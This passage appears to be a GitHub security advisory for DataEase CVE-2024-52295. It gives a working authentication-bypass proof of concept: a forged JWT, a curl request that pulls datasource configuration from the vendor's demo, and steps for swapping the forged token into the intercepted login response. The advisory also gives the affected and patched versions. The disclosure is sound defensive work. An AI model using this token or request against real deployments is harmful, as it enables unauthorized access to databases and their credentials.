mNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI4MDAyLWIyMjQ3NTU0LTJlYTEtNGRjMC04NTQwLWMyNjRmMzg4MzRjOC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNzk4YWM1ODI0OTdjYmJhZThkNDhhZmE3YmQyZWE1M2U3ODZmYWY2Nzk5OTU1MDg0YjYxODc2MzQzMjA4YzRmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.x4__sKBM5e2FPAHdPXjHbEvFPwoj1nyDOYNs4dnWZzs)

Generated jwt token:

```
X-DE-TOKEN:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.ok
ytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY

```

Here we will use the official website demo for demonstration.

```
curl 'https://demo.dataease.cn/de2api/datasource/hidePw/985188400292302848' \
 -H 'Accept: application/json, text/plain, */*' \
 -H 'Accept-Language: zh-CN' \
 -H 'X-DE-TOKEN:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.ok
ytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY'
```

[![image](https://private-user-images.githubusercontent.com/985347/385228886-a7d49ff5-0d1a-4f4b-951c-7350b5d6044a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI4ODg2LWE3ZDQ5ZmY1LTBkMWEtNGY0Yi05NTFjLTczNTBiNWQ2MDQ0YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wMDY4ZGM2YjliMjdmMTY0YTBmMDJkMTMwMDYwNTNjYzI0ZjdiYTk4YThjYmJjMzM1ZTFhNGE0YzA3ZjhiNDQ3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.yMjFs96tvS8kgaNvGgp0yn6bteGgOSUMQ1IpaMzGh6c)](https://private-user-images.githubusercontent.com/985347/385228886-a7d49ff5-0d1a-4f4b-951c-7350b5d6044a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI4ODg2LWE3ZDQ5ZmY1LTBkMWEtNGY0Yi05NTFjLTczNTBiNWQ2MDQ0YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wMDY4ZGM2YjliMjdmMTY0YTBmMDJkMTMwMDYwNTNjYzI0ZjdiYTk4YThjYmJjMzM1ZTFhNGE0YzA3ZjhiNDQ3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.yMjFs96tvS8kgaNvGgp0yn6bteGgOSUMQ1IpaMzGh6c)

Directly obtain the database configuration of the official website demo.

That is, when I log in, I fill it out casually, modify the data return package of the login interface, and then I can enter the system.

```
{"code":0,"msg":null,"data":
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5
OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY","exp":99999999999}}

```

[![image](https://private-user-images.githubusercontent.com/985347/385229579-0979bb74-1133-4ac6-a033-65a6e28ae98f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI5NTc5LTA5NzliYjc0LTExMzMtNGFjNi1hMDMzLTY1YTZlMjhhZTk4Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lMTZkYWYyYWVkNTQ5NmQxNDllMWI5MjdlNTEyYWM3ODM1OTAzOTk5YTQ0OGZkMTMxYTI4NzNlYzNhNWUzZmY5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.O8TXbvkLmcOFKk5DdAsTAdGCYapYvTKs3fxv-G-iEVk)](https://private-user-images.githubusercontent.com/985347/385229579-0979bb74-1133-4ac6-a033-65a6e28ae98f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI5NTc5LTA5NzliYjc0LTExMzMtNGFjNi1hMDMzLTY1YTZlMjhhZTk4Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lMTZkYWYyYWVkNTQ5NmQxNDllMWI5MjdlNTEyYWM3ODM1OTAzOTk5YTQ0OGZkMTMxYTI4NzNlYzNhNWUzZmY5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.O8TXbvkLmcOFKk5DdAsTAdGCYapYvTKs3fxv-G-iEVk)

Fill in any

[![image](https://private-user-images.githubusercontent.com/985347/385229756-2830352b-29f1-4273-94f9-a5fd98131324.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI5NzU2LTI4MzAzNTJiLTI5ZjEtNDI3My05NGY5LWE1ZmQ5ODEzMTMyNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04YmNjYzNiODkyYWFmN2Q0YTVlOGE1Mzc0MmJmY2RhZWI3ZjUxMDM3NDBiMGMyMjJhZTQxN2UxNzc2NzcyMzZhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.a2GqKuQZeNkgg72jUyeIXS-0_r6PIZwBOBM6bNLDTbI)](https://private-user-images.githubusercontent.com/985347/385229756-2830352b-29f1-4273-94f9-a5fd98131324.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI5NzU2LTI4MzAzNTJiLTI5ZjEtNDI3My05NGY5LWE1ZmQ5ODEzMTMyNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04YmNjYzNiODkyYWFmN2Q0YTVlOGE1Mzc0MmJmY2RhZWI3ZjUxMDM3NDBiMGMyMjJhZTQxN2UxNzc2NzcyMzZhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.a2GqKuQZeNkgg72jUyeIXS-0_r6PIZwBOBM6bNLDTbI)

Intercept the return packet and change it to the generated token

[![image](https://private-user-images.githubusercontent.com/985347/385230152-d0643673-8cc7-40e8-9bdf-22ea1dd889d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjMwMTUyLWQwNjQzNjczLThjYzctNDBlOC05YmRmLTIyZWExZGQ4ODlkMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xN2MzYTdlNzdmMmU5Y2FjNzg2YjdhYWRhOWZiZGMxNzMyYzE5YWExNjM2Y2NjZjY0YmQ5NmNiOTU4MmZiOGNlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.x9A6ne-YUI6Csgej-ZB_XYreHgpSyt-pCEr-HyeYpRk)](https://private-user-images.githubusercontent.com/985347/385230152-d0643673-8cc7-40e8-9bdf-22ea1dd889d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjMwMTUyLWQwNjQzNjczLThjYzctNDBlOC05YmRmLTIyZWExZGQ4ODlkMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xN2MzYTdlNzdmMmU5Y2FjNzg2YjdhYWRhOWZiZGMxNzMyYzE5YWExNjM2Y2NjZjY0YmQ5NmNiOTU4MmZiOGNlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.x9A6ne-YUI6Csgej-ZB_XYreHgpSyt-pCEr-HyeYpRk)

After refreshing, enter the system

[![image](https://private-user-images.githubusercontent.com/985347/385230372-7fa1b4d0-866a-47d4-a623-ddb62dcda46e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjMwMzcyLTdmYTFiNGQwLTg2NmEtNDdkNC1hNjIzLWRkYjYyZGNkYTQ2ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZjBlODAyYWI2ZmFhZTkwYTUwNDNhMzQ4NDBlN2IzMzBkZjNkMDI1MzNhMDA4MjMwZjYwZjM1MWIzMWMyYmM4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.9bYR_2VZkFnrPyN2qt43ZwQE1k6Sl9tenHTdDHcQmWc)](https://private-user-images.githubusercontent.com/985347/385230372-7fa1b4d0-866a-47d4-a623-ddb62dcda46e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjMwMzcyLTdmYTFiNGQwLTg2NmEtNDdkNC1hNjIzLWRkYjYyZGNkYTQ2ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZjBlODAyYWI2ZmFhZTkwYTUwNDNhMzQ4NDBlN2IzMzBkZjNkMDI1MzNhMDA4MjMwZjYwZjM1MWIzMWMyYmM4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.9bYR_2VZkFnrPyN2qt43ZwQE1k6Sl9tenHTdDHcQmWc)

Affected versions: <= 2.10.1

### Patches

The vulnerability has been fixed in v2.10.2.

### Workarounds

It is recommended to upgrade the version to v2.10.2.

### References

If you have any questions or comments about this advisory:

Open an issue in <https://github.com/dataease/dataease>

Email us at wei@fit2cloud.com

### Severity

Critical

### CVE ID

CVE-2024-52295

### Weaknesses

No CWEs

### Credits

* [![@unam4](https://avatars.githubusercontent.com/u/66824584?s=40&v=4)](/unam4)
  [unam4](/unam4)
  Reporter
* [![@springkill](https://avatars.githubusercontent.com/u/118535366?s=40&v=4)](/springkill)
  [springkill](/springkill)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


